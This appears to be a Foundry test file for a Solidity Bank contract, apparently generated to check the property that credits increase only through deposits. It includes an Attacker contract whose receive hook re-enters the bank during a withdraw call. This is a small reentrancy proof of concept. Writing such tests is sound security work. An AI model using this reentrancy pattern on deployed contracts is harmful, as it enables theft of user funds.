pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

// Replacement for: abstract contracts[] cs;
contract Attacker {
    Bank public bank;
    constructor(Bank _bank) {
        bank = _bank;
    }
    receive() external payable {
        // Reenter and deposit the received ETH back into the bank
        bank.deposit{value: msg.value}();
    }
}

contract BankTest is Test {       
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        // Replacement for: abstract address bank_deployer;
        address bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        // Replacement for: bank = new Bank(abstract constructor_params);
        bank = new Bank();
    }
    
    function test_credits_inc_onlyif_deposit_violation() public {

        // Replacement for: abstract transaction[] txs;
        Attacker attacker = new Attacker(bank);
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        bank.deposit{value: 32}();

        // Replacement for: abstract address user;
        address user = address(attacker);
        assertNotEq(user, address(bank), "user address equal to bank address");

        uint256 user_credits_before = bank.credits(user);

        // Replacement for: abstract address sender;
        address sender = address(attacker);
        vm.prank(sender);

        // Replacement for abstract call parameters
        // abstract bytes4 function_selector;
        bytes4 function_selector = bank.withdraw.selector;
        // abstract uint256 msg_value;
        uint256 msg_value = 0;
        // abstract bytes memory params;
        bytes memory params = hex"";

        // Dynamically call the function with function_selector selector and passed parameters
        // withdraw(uint) will decode amount = 32 due to ABI encoding of a single bytes param
        address(bank).call{value: msg_value}(abi.encodeWithSelector(function_selector, params));        
	
        assert(function_selector != bank.deposit.selector || sender != user);

        uint256 user_credits_after = bank.credits(user);
        assertGt(user_credits_after, user_credits_before, "user credits did not increase");
    }
}